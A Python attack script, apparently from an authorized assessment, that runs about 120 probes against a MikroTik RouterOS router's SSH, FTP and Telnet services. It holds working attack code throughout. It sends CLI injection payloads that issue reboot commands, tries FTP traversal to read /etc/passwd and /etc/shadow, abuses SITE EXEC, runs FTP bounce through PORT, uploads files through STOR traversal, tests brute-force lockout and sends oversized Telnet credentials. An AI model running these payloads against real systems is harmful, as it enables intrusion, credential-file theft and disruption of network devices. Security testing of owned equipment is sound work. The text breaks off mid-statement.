#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 — SSH/FTP/Telnet Service Attacks
Phase 6, Script 2 of 4
Target: [REDACTED-INTERNAL-IP] (SSH:22, FTP:21, Telnet:23)

Tests (~120):
  SSH (~40):  algorithm enumeration, weak key exchange, auth methods,
              post-auth CLI injection, channel request fuzzing, banner analysis
  FTP (~40):  anonymous login, directory traversal, SITE commands, PORT/PASV
              abuse, large filenames, bounce attacks, STOR/RETR traversal
  Telnet (~40): banner capture, cleartext creds, escape injection, buffer
                overflow (long username/password), command injection, IAC fuzzing

Evidence: evidence/ssh_ftp_telnet_attacks.json
"""

import ftplib
import os
import socket
import struct
import sys
import time
import warnings

warnings.filterwarnings("ignore")

sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/scripts')
from mikrotik_common import *

ec = EvidenceCollector("attack_ssh_ftp_telnet.py", phase=6)


# =============================================================================
# SSH Tests (~40)
# =============================================================================

def ssh_tests():
    log("=" * 60)
    log("Section 1: SSH Attacks (port 22)")
    log("=" * 60)

    import paramiko

    # ── Test 1: Banner grabbing ──────────────────────────────────────────────
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET, 22))
        banner = s.recv(1024).decode("utf-8", errors="replace").strip()
        s.close()

        ec.add_test("ssh", "SSH banner grab",
                    "Capture SSH identification string for version disclosure",
                    f"Banner: {banner}",
                    {"banner": banner},
                    anomaly=True)

        if "dropbear" in banner.lower() or "openssh" in banner.lower() or "mikrotik" in banner.lower():
            ec.add_finding("INFO", "SSH version disclosure",
                           f"SSH banner reveals software identity: {banner}",
                           cwe="CWE-200")
    except Exception as e:
        ec.add_test("ssh", "SSH banner grab", "SSH banner capture", f"Error: {e}")

    # ── Test 2-5: Algorithm enumeration (deprecated/weak algorithms) ────────
    try:
        t = paramiko.Transport((TARGET, 22))
        t.connect()
        sec_opts = t.get_security_options()

        algo_data = {
            "kex": list(sec_opts.kex),
            "ciphers": list(sec_opts.ciphers),
            "digests": list(sec_opts.digests),
            "key_types": list(sec_opts.key_types),
        }

        ec.add_test("ssh", "SSH algorithm enumeration (paramiko)",
                    "Enumerate KEX, cipher, MAC, and key type algorithms via paramiko",
                    f"KEX: {len(algo_data['kex'])}, Ciphers: {len(algo_data['ciphers'])}, "
                    f"MACs: {len(algo_data['digests'])}, Keys: {len(algo_data['key_types'])}",
                    {"algorithms": algo_data})

        # Check for weak algorithms
        weak_ciphers = [c for c in algo_data["ciphers"]
                        if any(w in c.lower() for w in ["des", "rc4", "arcfour", "blowfish", "cast"])]
        weak_kex = [k for k in algo_data["kex"]
                    if any(w in k.lower() for w in ["sha1", "group1", "group14-sha1"])]
        weak_macs = [m for m in algo_data["digests"]
                     if any(w in m.lower() for w in ["md5", "sha1-96", "md5-96"])]

        if weak_ciphers:
            ec.add_test("ssh", "Weak SSH ciphers",
                        "Identify deprecated or weak cipher algorithms",
                        f"Weak ciphers: {weak_ciphers}",
                        {"weak_ciphers": weak_ciphers},
                        anomaly=True)
            ec.add_finding("LOW", "SSH weak cipher support",
                           f"SSH server supports weak ciphers: {', '.join(weak_ciphers)}",
                           cwe="CWE-327")
        else:
            ec.add_test("ssh", "Weak SSH ciphers",
                        "Check for deprecated cipher algorithms",
                        "No weak ciphers found")

        if weak_kex:
            ec.add_test("ssh", "Weak SSH key exchange",
                        "Identify deprecated key exchange algorithms",
                        f"Weak KEX: {weak_kex}",
                        {"weak_kex": weak_kex},
                        anomaly=True)
        else:
            ec.add_test("ssh", "Weak SSH key exchange",
                        "Check for deprecated KEX algorithms",
                        "No weak KEX found")

        if weak_macs:
            ec.add_test("ssh", "Weak SSH MACs",
                        "Identify deprecated MAC algorithms",
                        f"Weak MACs: {weak_macs}",
                        {"weak_macs": weak_macs},
                        anomaly=True)
        else:
            ec.add_test("ssh", "Weak SSH MACs",
                        "Check for deprecated MAC algorithms",
                        "No weak MACs found")

        t.close()
    except Exception as e:
        ec.add_test("ssh", "SSH algorithm enumeration",
                    "Algorithm enumeration via paramiko", f"Error: {e}")

    # ── Test 6-8: Authentication method testing ─────────────────────────────
    auth_methods_tested = {}

    # Password auth
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(TARGET, port=22, username=ADMIN_USER, password=ADMIN_PASS,
                       timeout=10, allow_agent=False, look_for_keys=False)
        ec.add_test("ssh", "SSH password auth",
                    "Test password authentication with valid credentials",
                    "Password authentication succeeded",
                    {"method": "password", "user": ADMIN_USER})
        auth_methods_tested["password"] = True
        client.close()
    except paramiko.AuthenticationException:
        ec.add_test("ssh", "SSH password auth",
                    "Test password authentication",
                    "Password authentication rejected")
        auth_methods_tested["password"] = False
    except Exception as e:
        ec.add_test("ssh", "SSH password auth",
                    "Password auth test", f"Error: {e}")

    # Keyboard-interactive auth
    try:
        t = paramiko.Transport((TARGET, 22))
        t.connect()
        try:
            t.auth_interactive(ADMIN_USER, lambda title, instructions, prompts:
                               [ADMIN_PASS] * len(prompts))
            ec.add_test("ssh", "SSH keyboard-interactive auth",
                        "Test keyboard-interactive authentication",
                        "Keyboard-interactive auth succeeded",
                        {"method": "keyboard-interactive"})
            auth_methods_tested["keyboard-interactive"] = True
        except paramiko.AuthenticationException:
            ec.add_test("ssh", "SSH keyboard-interactive auth",
                        "Test keyboard-interactive authentication",
                        "Keyboard-interactive auth rejected or not supported")
            auth_methods_tested["keyboard-interactive"] = False
        t.close()
    except Exception as e:
        ec.add_test("ssh", "SSH keyboard-interactive auth",
                    "Keyboard-interactive test", f"Error: {e}")

    # Publickey auth (should fail — no key configured)
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        key = paramiko.RSAKey.generate(2048)
        try:
            client.connect(TARGET, port=22, username=ADMIN_USER, pkey=key,
                           timeout=10, allow_agent=False, look_for_keys=False)
            ec.add_test("ssh", "SSH publickey auth (random key)",
                        "Test publickey authentication with random RSA key",
                        "Publickey auth SUCCEEDED with random key!",
                        anomaly=True)
            auth_methods_tested["publickey"] = True
            client.close()
        except paramiko.AuthenticationException:
            ec.add_test("ssh", "SSH publickey auth (random key)",
                        "Test publickey authentication with unauthorized key",
                        "Publickey auth rejected (expected)")
            auth_methods_tested["publickey"] = False
    except Exception as e:
        ec.add_test("ssh", "SSH publickey auth",
                    "Publickey auth test", f"Error: {e}")

    ec.add_test("ssh", "SSH auth methods summary",
                "Summary of tested authentication methods",
                f"Methods tested: {auth_methods_tested}",
                {"methods": auth_methods_tested})

    # ── Test 9: Auth method enumeration via paramiko transport ──────────────
    try:
        t = paramiko.Transport((TARGET, 22))
        t.connect()
        try:
            t.auth_none(ADMIN_USER)
        except paramiko.BadAuthenticationType as e:
            allowed = e.allowed_types
            ec.add_test("ssh", "SSH allowed auth types",
                        "Enumerate allowed authentication types via auth_none",
                        f"Allowed: {allowed}",
                        {"allowed_types": allowed})
        except Exception:
            pass
        t.close()
    except Exception as e:
        ec.add_test("ssh", "SSH allowed auth types",
                    "Auth type enumeration", f"Error: {e}")

    # ── Test 10: Failed login attempts (brute force lockout?) ──────────────
    log("  Testing failed login lockout behavior...")
    failures = 0
    locked_out = False
    for i in range(10):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(TARGET, port=22, username="admin", password="WrongPass" + str(i),
                           timeout=5, allow_agent=False, look_for_keys=False)
            client.close()
        except paramiko.AuthenticationException:
            failures += 1
        except Exception as e:
            if "Connection refused" in str(e) or "timed out" in str(e):
                locked_out = True
                break
            failures += 1

    # Now try valid login
    valid_after_failures = False
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(TARGET, port=22, username=ADMIN_USER, password=ADMIN_PASS,
                       timeout=10, allow_agent=False, look_for_keys=False)
        valid_after_failures = True
        client.close()
    except:
        valid_after_failures = False

    ec.add_test("ssh", "SSH brute force lockout test",
                "Send 10 failed logins then attempt valid login",
                f"Failures: {failures}, locked_out: {locked_out}, valid_after: {valid_after_failures}",
                {"failed_attempts": failures, "locked_out": locked_out,
                 "valid_login_after": valid_after_failures},
                anomaly=not valid_after_failures)

    if not locked_out and valid_after_failures:
        ec.add_test("ssh", "No SSH brute force protection",
                    "SSH does not lock out after 10 failed attempts",
                    "No lockout detected — brute force possible",
                    anomaly=True)

    check_router_alive()

    # ── Test 11-20: Post-auth CLI command injection ────────────────────────
    log("  Testing post-auth CLI command injection...")
    injection_payloads = [
        ("; /system reboot", "Semicolon command separator"),
        ("| /system reboot", "Pipe command chaining"),
        ("$(reboot)", "Command substitution $()"),
        ("`reboot`", "Backtick command substitution"),
        ("/system reboot\n/user print", "Newline injection"),
        ("& /system reboot", "Ampersand background"),
        ("|| /system reboot", "OR operator injection"),
        ("&& /system reboot", "AND operator injection"),
        ("/export; /system reboot", "RouterOS command chain"),
        ("../../../etc/passwd", "Path traversal in command"),
    ]

    for payload, description in injection_payloads:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(TARGET, port=22, username=ADMIN_USER, password=ADMIN_PASS,
                           timeout=10, allow_agent=False, look_for_keys=False)

            # Execute the injection payload as part of a command
            cmd = f"/system identity print {payload}"
            stdin, stdout, stderr = client.exec_command(cmd, timeout=5)
            out = stdout.read().decode("utf-8", errors="replace")
            err = stderr.read().decode("utf-8", errors="replace")

            ec.add_test("ssh", f"CLI injection: {description}",
                        f"Post-auth command injection attempt: {description}",
                        f"Output: {out[:200]}, Err: {err[:200]}",
                        {"command": cmd, "stdout": out[:500], "stderr": err[:500],
                         "payload": payload},
                        anomaly="reboot" in out.lower() or "shutdown" in out.lower())
            client.close()
        except Exception as e:
            ec.add_test("ssh", f"CLI injection: {description}",
                        f"CLI injection test", f"Error: {e}")

    check_router_alive()

    # ── Test 21-28: SSH channel request fuzzing ────────────────────────────
    log("  Testing SSH channel request fuzzing...")
    channel_types = [
        "shell",
        "exec",
        "subsystem",
        "direct-tcpip",
        "forwarded-tcpip",
        "x11",
        "auth-agent@openssh.com",
        "AAAA" * 100,  # Long channel type
    ]

    for ch_type in channel_types:
        try:
            t = paramiko.Transport((TARGET, 22))
            t.connect(username=ADMIN_USER, password=ADMIN_PASS)
            try:
                chan = t.open_channel(ch_type, timeout=5)
                ec.add_test("ssh", f"Channel type: {ch_type[:50]}",
                            f"Request SSH channel of type '{ch_type[:50]}'",
                            "Channel opened!",
                            {"channel_type": ch_type[:100], "accepted": True})
                chan.close()
            except paramiko.ChannelException as e:
                ec.add_test("ssh", f"Channel type: {ch_type[:50]}",
                            f"Request SSH channel of type '{ch_type[:50]}'",
                            f"Rejected: {e}",
                            {"channel_type": ch_type[:100], "accepted": False,
                             "error": str(e)})
            except Exception as e:
                ec.add_test("ssh", f"Channel type: {ch_type[:50]}",
                            f"Channel request test", f"Error: {e}")
            t.close()
        except Exception as e:
            ec.add_test("ssh", f"Channel type: {ch_type[:50]}",
                        f"Channel request test", f"Transport error: {e}")

    # ── Test 29-32: SSH subsystem requests ─────────────────────────────────
    log("  Testing SSH subsystem requests...")
    subsystems = ["sftp", "netconf", "shell", "admin", "mikrotik", "routeros"]
    for sub in subsystems:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(TARGET, port=22, username=ADMIN_USER, password=ADMIN_PASS,
                           timeout=10, allow_agent=False, look_for_keys=False)
            t = client.get_transport()
            chan = t.open_session()
            try:
                chan.invoke_subsystem(sub)
                ec.add_test("ssh", f"Subsystem: {sub}",
                            f"Request SSH subsystem '{sub}'",
                            "Subsystem accepted!",
                            {"subsystem": sub, "accepted": True})
                # Try to read any data from subsystem
                chan.settimeout(2)
                try:
                    data = chan.recv(4096)
                    ec.add_test("ssh", f"Subsystem data: {sub}",
                                f"Read data from subsystem '{sub}'",
                                f"Received {len(data)} bytes",
                                {"subsystem": sub, "data_hex": data.hex()[:200]})
                except socket.timeout:
                    pass
                chan.close()
            except Exception as e:
                ec.add_test("ssh", f"Subsystem: {sub}",
                            f"Request SSH subsystem '{sub}'",
                            f"Rejected: {e}",
                            {"subsystem": sub, "accepted": False})
            client.close()
        except Exception as e:
            ec.add_test("ssh", f"Subsystem: {sub}",
                        f"Subsystem test", f"Error: {e}")

    # ── Test 33-36: SSH exec with special commands ─────────────────────────
    log("  Testing SSH exec with special commands...")
    exec_cmds = [
        ("/export", "Export full configuration"),
        ("/user print detail", "Enumerate users with details"),
        ("/ip address print", "List IP addresses"),
        ("/system package print", "List packages"),
        ("/file print", "List files"),
        ("/system logging print", "View logging config"),
        ("/ip service print", "List enabled services"),
        ("/system history print", "View change history"),
    ]

    for cmd, desc in exec_cmds:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(TARGET, port=22, username=ADMIN_USER, password=ADMIN_PASS,
                           timeout=10, allow_agent=False, look_for_keys=False)
            stdin, stdout, stderr = client.exec_command(cmd, timeout=10)
            out = stdout.read().decode("utf-8", errors="replace")
            err = stderr.read().decode("utf-8", errors="replace")

            ec.add_test("ssh", f"Exec: {desc}",
                        f"Execute '{cmd}' via SSH exec channel",
                        f"Output: {len(out)} chars",
                        {"command": cmd, "stdout": out[:1000], "stderr": err[:500]})
            client.close()
        except Exception as e:
            ec.add_test("ssh", f"Exec: {desc}", f"SSH exec test", f"Error: {e}")

    check_router_alive()


# =============================================================================
# FTP Tests (~40)
# =============================================================================

def ftp_tests():
    log("=" * 60)
    log("Section 2: FTP Attacks (port 21)")
    log("=" * 60)

    # ── Test 1: Anonymous login ────────────────────────────────────────────
    try:
        ftp = ftplib.FTP(TARGET, timeout=10)
        banner = ftp.getwelcome()
        ec.add_test("ftp", "FTP banner",
                    "FTP welcome banner capture",
                    f"Banner: {banner}",
                    {"banner": banner},
                    anomaly="MikroTik" in banner or "RouterOS" in banner)

        try:
            ftp.login("anonymous", "test@test.com")
            ec.add_test("ftp", "FTP anonymous login",
                        "Attempt anonymous FTP login",
                        "Anonymous login SUCCEEDED!",
                        anomaly=True)
            ec.add_finding("HIGH", "FTP anonymous access enabled",
                           "Anonymous FTP login accepted — exposes filesystem",
                           cwe="CWE-287")
            ftp.quit()
        except ftplib.error_perm:
            ec.add_test("ftp", "FTP anonymous login",
                        "Attempt anonymous FTP login",
                        "Anonymous login rejected (expected)")
        ftp.close()
    except Exception as e:
        ec.add_test("ftp", "FTP banner/anonymous",
                    "FTP connection and anonymous login", f"Error: {e}")

    # ── Test 2-3: Authenticated FTP commands ──────────────────────────────
    try:
        ftp = ftplib.FTP(TARGET, timeout=10)
        ftp.login(ADMIN_USER, ADMIN_PASS)

        # SYST, FEAT, HELP
        for cmd in ["SYST", "FEAT", "HELP", "STAT"]:
            try:
                resp = ftp.sendcmd(cmd)
                ec.add_test("ftp", f"FTP {cmd} command",
                            f"FTP {cmd} command response (information disclosure)",
                            f"Response: {resp[:300]}",
                            {"command": cmd, "response": resp},
                            anomaly=cmd == "SYST")
            except ftplib.error_perm as e:
                ec.add_test("ftp", f"FTP {cmd} command",
                            f"FTP {cmd} command", f"Rejected: {e}")

        # ── Test 4-10: Directory traversal attacks ────────────────────────
        log("  Testing FTP directory traversal...")
        traversal_paths = [
            "../../etc/passwd",
            "....//....//etc/passwd",
            "../../../etc/shadow",
            "..\\..\\..\\etc\\passwd",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/etc/passwd",
            "/../../../etc/passwd",
            "./../../../etc/passwd",
            "..;/etc/passwd",
        ]

        for path in traversal_paths:
            try:
                ftp.cwd("/")
            except:
                pass
            try:
                ftp.cwd(path)
                ec.add_test("ftp", f"FTP CWD traversal: {path[:50]}",
                            f"Directory traversal via CWD to '{path[:50]}'",
                            "CWD SUCCEEDED (traversal possible!)",
                            {"path": path},
                            anomaly=True)
                ec.add_finding("HIGH", "FTP directory traversal via CWD",
                               f"FTP CWD accepted path traversal: {path}",
                               cwe="CWE-22")
            except ftplib.error_perm as e:
                ec.add_test("ftp", f"FTP CWD traversal: {path[:50]}",
                            f"Directory traversal via CWD",
                            f"Blocked: {e}",
                            {"path": path})
            except Exception as e:
                ec.add_test("ftp", f"FTP CWD traversal: {path[:50]}",
                            f"CWD traversal test", f"Error: {e}")

        # ── Test 11-14: RETR path traversal ───────────────────────────────
        log("  Testing FTP RETR path traversal...")
        retr_paths = [
            "../../etc/passwd",
            "../../../etc/shadow",
            "/etc/passwd",
            "....//etc//passwd",
        ]

        for path in retr_paths:
            try:
                lines = []
                ftp.retrlines(f"RETR {path}", lines.append)
                ec.add_test("ftp", f"FTP RETR traversal: {path[:50]}",
                            f"File retrieval traversal via RETR '{path[:50]}'",
                            f"Retrieved {len(lines)} lines!",
                            {"path": path, "lines": lines[:10]},
                            anomaly=True)
                ec.add_finding("HIGH", "FTP file retrieval traversal",
                               f"RETR accepted path traversal: {path}",
                               cwe="CWE-22")
            except ftplib.error_perm as e:
                ec.add_test("ftp", f"FTP RETR traversal: {path[:50]}",
                            f"RETR traversal test",
                            f"Blocked: {e}",
                            {"path": path})
            except Exception as e:
                ec.add_test("ftp", f"FTP RETR traversal: {path[:50]}",
                            f"RETR traversal test", f"Error: {e}")

        # ── Test 15-17: SITE command enumeration ──────────────────────────
        log("  Testing FTP SITE commands...")
        site_cmds = ["HELP", "CHMOD 777 test", "EXEC ls", "CPFR /etc/passwd",
                     "CPTO /tmp/pwned", "UMASK 000", "UTIME test"]
        for cmd in site_cmds:
            try:
                resp = ftp.sendcmd(f"SITE {cmd}")
                ec.add_test("ftp", f"FTP SITE {cmd.split()[0]}",
                            f"Test SITE {cmd} command",
                            f"Response: {resp[:200]}",
                            {"command": f"SITE {cmd}", "response": resp},
                            anomaly="200" in str(resp) or "250" in str(resp))
            except ftplib.error_perm as e:
                ec.add_test("ftp", f"FTP SITE {cmd.split()[0]}",
                            f"SITE command test", f"Rejected: {e}")
            except Exception as e:
                ec.add_test("ftp", f"FTP SITE {cmd.split()[0]}",
                            f"SITE command test", f"Error: {e}")

        # ── Test 18-20: PORT/PASV abuse ───────────────────────────────────
        log("  Testing FTP PORT/PASV abuse...")

        # FTP bounce: PORT pointing to an internal IP
        bounce_targets = [
            ("127.0.0.1", 80, "Loopback HTTP"),
            ("[REDACTED-INTERNAL-IP]", 22, "Self SSH"),
            ("[REDACTED-INTERNAL-IP]", 80, "Private network"),
        ]
        for ip, port, desc in bounce_targets:
            try:
                # Convert IP and port to PORT command format
                parts = ip.split(".")
                p1, p2 = port // 256, port % 256
                port_cmd = f"PORT {','.join(parts)},{p1},{p2}"
                resp = ftp.sendcmd(port_cmd)
                ec.add_test("ftp", f"FTP bounce: {desc}",
                            f"FTP bounce attack via PORT to {ip}:{port}",
                            f"PORT response: {resp}",
                            {"target_ip": ip, "target_port": port, "response": resp},
                            anomaly="200" in resp)
                if "200" in resp:
                    ec.add_finding("MEDIUM", f"FTP bounce possible to {desc}",
                                   f"FTP PORT command accepted for {ip}:{port}",
                                   cwe="CWE-441")
            except ftplib.error_perm as e:
                ec.add_test("ftp", f"FTP bounce: {desc}",
                            f"FTP bounce test", f"Blocked: {e}")
            except Exception as e:
                ec.add_test("ftp", f"FTP bounce: {desc}",
                            f"FTP bounce test", f"Error: {e}")

        # PASV test
        try:
            resp = ftp.sendcmd("PASV")
            ec.add_test("ftp", "FTP PASV response",
                        "Issue PASV command and analyze response",
                        f"PASV: {resp}",
                        {"response": resp})
        except Exception as e:
            ec.add_test("ftp", "FTP PASV response",
                        "PASV test", f"Error: {e}")

        # EPSV test
        try:
            resp = ftp.sendcmd("EPSV")
            ec.add_test("ftp", "FTP EPSV response",
                        "Issue EPSV command and analyze response",
                        f"EPSV: {resp}",
                        {"response": resp})
        except Exception as e:
            ec.add_test("ftp", "FTP EPSV response",
                        "EPSV test", f"Error: {e}")

        # ── Test 21-22: Large filename test ───────────────────────────────
        log("  Testing FTP large filename handling...")
        long_names = [
            "A" * 256,
            "A" * 1024,
        ]
        for name in long_names:
            try:
                ftp.cwd("/")
                resp = ftp.mkd(name)
                ec.add_test("ftp", f"FTP MKD long name ({len(name)}B)",
                            f"Create directory with {len(name)}-byte name",
                            f"Created! Response: {resp[:200]}",
                            {"name_length": len(name), "response": resp[:200]},
                            anomaly=True)
                # Cleanup
                try:
                    ftp.rmd(name)
                except:
                    pass
            except ftplib.error_perm as e:
                ec.add_test("ftp", f"FTP MKD long name ({len(name)}B)",
                            f"Long filename test",
                            f"Rejected: {e}",
                            {"name_length": len(name)})
            except Exception as e:
                ec.add_test("ftp", f"FTP MKD long name ({len(name)}B)",
                            f"Long filename test", f"Error: {e}")

        # ── Test 23-26: STOR path traversal ───────────────────────────────
        log("  Testing FTP STOR path traversal...")
        stor_paths = [
            "../../tmp/ftp_test_traversal",
            "/tmp/ftp_test_direct",
            "../../../tmp/ftp_pwned",
            "....//tmp//ftp_test",
        ]

        from io import BytesIO
        for path in stor_paths:
            try:
                ftp.cwd("/")
                test_data = BytesIO(b"FTP_TRAVERSAL_TEST_DATA")
                resp = ftp.storbinary(f"STOR {path}", test_data)
                ec.add_test("ftp", f"FTP STOR traversal: {path[:50]}",
                            f"Upload file via STOR with path traversal '{path[:50]}'",
                            f"Upload response: {resp}",
                            {"path": path, "response": resp},
                            anomaly=True)
                ec.add_finding("HIGH", "FTP upload traversal",
                               f"STOR accepted path traversal: {path}",
                               cwe="CWE-22")
                # Cleanup
                try:
                    ftp.delete(path)
                except:
                    pass
            except ftplib.error_perm as e:
                ec.add_test("ftp", f"FTP STOR traversal: {path[:50]}",
                            f"STOR traversal test",
                            f"Blocked: {e}",
                            {"path": path})
            except Exception as e:
                ec.add_test("ftp", f"FTP STOR traversal: {path[:50]}",
                            f"STOR traversal test", f"Error: {e}")

        # ── Test 27-30: Symbolic link traversal ───────────────────────────
        log("  Testing FTP symlink handling...")
        # Try to create symlinks via SITE commands if supported
        try:
            resp = ftp.sendcmd("SITE SYMLINK /etc/passwd pwned_link")
            ec.add_test("ftp", "FTP SITE SYMLINK",
                        "Attempt to create symlink via FTP SITE command",
                        f"Response: {resp}",
                        {"response": resp},
                        anomaly="200" in resp or "250" in resp)
        except ftplib.error_perm as e:
            ec.add_test("ftp", "FTP SITE SYMLINK",
                        "Symlink creation via SITE",
                        f"Rejected: {e}")
        except Exception as e:
            ec.add_test("ftp", "FTP SITE SYMLINK",
                        "SITE SYMLINK test", f"Error: {e}")

        # ── Test 31-33: Unicode/special chars in filenames ────────────────
        special_names = [
            "\x00test_null",
            "test\nline",
            "test\rreturn",
            "test;cmd",
            "test|pipe",
            "test`backtick`",
        ]
        for name in special_names:
            try:
                ftp.cwd("/")
                resp = ftp.mkd(name)
                ec.add_test("ftp", f"FTP special filename: {repr(name)[:30]}",
                            f"Create directory with special chars: {repr(name)[:30]}",
                            f"Created: {resp}",
                            {"name_repr": repr(name)},
                            anomaly=True)
                try:
                    ftp.rmd(name)
                except:
                    pass
            except ftplib.error_perm as e:
                ec.add_test("ftp", f"FTP special filename: {repr(name)[:30]}",
                            f"Special filename test", f"Rejected: {e}")
            except Exception as e:
                ec.add_test("ftp", f"FTP special filename: {repr(name)[:30]}",
                            f"Special filename test", f"Error: {e}")

        # ── Test 34-36: FTP command injection ─────────────────────────────
        injection_cmds = [
            ("CWD /\r\nDELE test", "CWD newline injection"),
            ("MKD test\r\nSITE EXEC ls", "MKD newline injection"),
            ("RMD test\x00../../etc", "RMD null byte injection"),
        ]
        for raw_cmd, desc in injection_cmds:
            try:
                # Use raw socket to send injected commands
                resp = ftp.sendcmd(raw_cmd)
                ec.add_test("ftp", f"FTP injection: {desc}",
                            f"Command injection test: {desc}",
                            f"Response: {resp[:200]}",
                            {"raw_command": repr(raw_cmd), "response": resp[:200]},
                            anomaly=True)
            except Exception as e:
                ec.add_test("ftp", f"FTP injection: {desc}",
                            f"FTP command injection test", f"Rejected/Error: {e}")

        ftp.quit()
    except Exception as e:
        ec.add_test("ftp", "FTP authenticated session",
                    "Authenticated FTP connection", f"Error: {e}")

    check_router_alive()


# =============================================================================
# Telnet Tests (~40)
# =============================================================================

def telnet_tests():
    log("=" * 60)
    log("Section 3: Telnet Attacks (port 23)")
    log("=" * 60)

    # ── Test 1: Banner capture and analysis ───────────────────────────────
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET, 23))
        time.sleep(1)

        data = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
            except socket.timeout:
                break

        # Parse IAC sequences
        iac_sequences = []
        text_bytes = bytearray()
        i = 0
        while i < len(data):
            if data[i] == 0xFF and i + 2 < len(data):
                cmd_byte = data[i + 1]
                opt_byte = data[i + 2]
                cmd_names = {251: "WILL", 252: "WONT", 253: "DO", 254: "DONT", 250: "SB"}
                iac_sequences.append({
                    "command": cmd_names.get(cmd_byte, f"0x{cmd_byte:02x}"),
                    "option": opt_byte
                })
                i += 3
            else:
                text_bytes.append(data[i])
                i += 1

        text_content = text_bytes.decode("utf-8", errors="replace").strip()

        ec.add_test("telnet", "Telnet banner capture",
                    "Capture telnet initial banner and IAC negotiation",
                    f"Received {len(data)} bytes, {len(iac_sequences)} IAC sequences",
                    {"raw_hex": data.hex()[:500], "text": text_content[:500],
                     "iac_sequences": iac_sequences, "raw_size": len(data)},
                    anomaly="MikroTik" in text_content or "RouterOS" in text_content)

        if "MikroTik" in text_content or "RouterOS" in text_content:
            ec.add_finding("INFO", "Telnet banner discloses product identity",
                           f"Telnet banner reveals: {text_content[:200]}",
                           cwe="CWE-200")
        s.close()
    except Exception as e:
        ec.add_test("telnet", "Telnet banner capture",
                    "Telnet banner analysis", f"Error: {e}")

    # ── Test 2: Cleartext credential capture ──────────────────────────────
    log("  Testing cleartext credential transmission...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET, 23))
        time.sleep(1)

        # Drain initial negotiation
        try:
            s.recv(4096)
        except:
            pass

        # Reply to common IAC negotiations with WILL/WONT
        s.send(b"\xff\xfb\x18\xff\xfb\x20\xff\xfb\x23\xff\xfb\x27")
        time.sleep(0.5)
        try:
            s.recv(4096)
        except:
            pass

        # Send username
        s.send(ADMIN_USER.encode() + b"\r\n")
        time.sleep(1)
        try:
            login_prompt = s.recv(4096)
        except:
            login_prompt = b""

        # Send password
        s.send(ADMIN_PASS.encode() + b"\r\n")
        time.sleep(1)
        try:
            auth_response = s.recv(4096)
        except:
            auth_response = b""

        auth_text = auth_response.decode("utf-8", errors="replace")
        login_success = ">" in auth_text or "[admin@" in auth_text or "MikroTik" in auth_text

        ec.add_test("telnet", "Cleartext credential transmission",
                    "Confirm telnet transmits credentials in cleartext (network sniffable)",
                    f"Login {'succeeded' if login_success else 'failed'} — credentials sent in cleartext",
                    {"login_success": login_success,
                     "auth_response": auth_text[:500],
                     "cleartext_user": True, "cleartext_pass": True},
                    anomaly=True)

        if login_success:
            ec.add_finding("MEDIUM", "Telnet cleartext credential transmission",
                           "Telnet service transmits credentials without encryption, "
                           "vulnerable to network sniffing",
                           cwe="CWE-319")
        s.close()
    except Exception as e:
        ec.add_test("telnet", "Cleartext credential capture",
                    "Telnet cleartext test", f"Error: {e}")

    check_router_alive()

    # ── Test 3-8: Terminal escape sequence injection ──────────────────────
    log("  Testing terminal escape sequence injection...")
    escape_sequences = [
        ("\x1b[2J", "Screen clear (CSI 2J)"),
        ("\x1b[0m\x1b[31mREDTEXT\x1b[0m", "ANSI color injection"),
        ("\x1b]0;PWNED\x07", "Title bar injection (OSC)"),
        ("\x1b[?25l", "Hide cursor (CSI ?25l)"),
        ("\x1b[6n", "Cursor position query (CSI 6n)"),
        ("\x1b[3J", "Clear scrollback buffer"),
        ("\x1b[s\x1b[1;1H\x1b[2KPWNED\x1b[u", "Save/restore cursor injection"),
        ("\x1b[?1049h", "Alternate screen buffer switch"),
        ("\x0d\x0aFAKE_PROMPT> ", "Carriage return prompt spoofing"),
        ("\x1bP+q444f\x1b\\", "DCS query (potential info leak)"),
    ]

    for seq, desc in escape_sequences:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((TARGET, 23))
            time.sleep(0.5)
            try:
                s.recv(4096)  # drain banner
            except:
                pass

            # Send escape sequence as username
            s.send(seq.encode("utf-8", errors="replace") + b"\r\n")
            time.sleep(0.5)
            try:
                resp = s.recv(4096)
                resp_text = resp.decode("utf-8", errors="replace")
            except:
                resp = b""
                resp_text = ""

            ec.add_test("telnet", f"Escape injection: {desc}",
                        f"Send terminal escape sequence: {desc}",
                        f"Response: {len(resp)} bytes",
                        {"sequence": repr(seq), "description": desc,
                         "response_hex": resp.hex()[:200] if resp else "",
                         "response_text": resp_text[:200]},
                        anomaly="\x1b" in resp_text)
            s.close()
        except Exception as e:
            ec.add_test("telnet", f"Escape injection: {desc}",
                        f"Escape sequence test", f"Error: {e}")

    check_router_alive()

    # ── Test 9-14: Buffer overflow (long username/password) ──────────────
    log("  Testing telnet buffer overflow (long credentials)...")
    overflow_sizes = [256, 512, 1024, 4096, 10240]

    for size in overflow_sizes:
        # Long username
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((TARGET, 23))
            time.sleep(0.5)
            try:
                s.recv(4096)
            except:
                pass

            long_user = "A" * size
            s.send(long_user.encode() + b"\r\n")
            time.sleep(0.5)
            try:
                resp = s.recv(4096)
                ec.add_test("telnet", f"Long username ({size}B)",
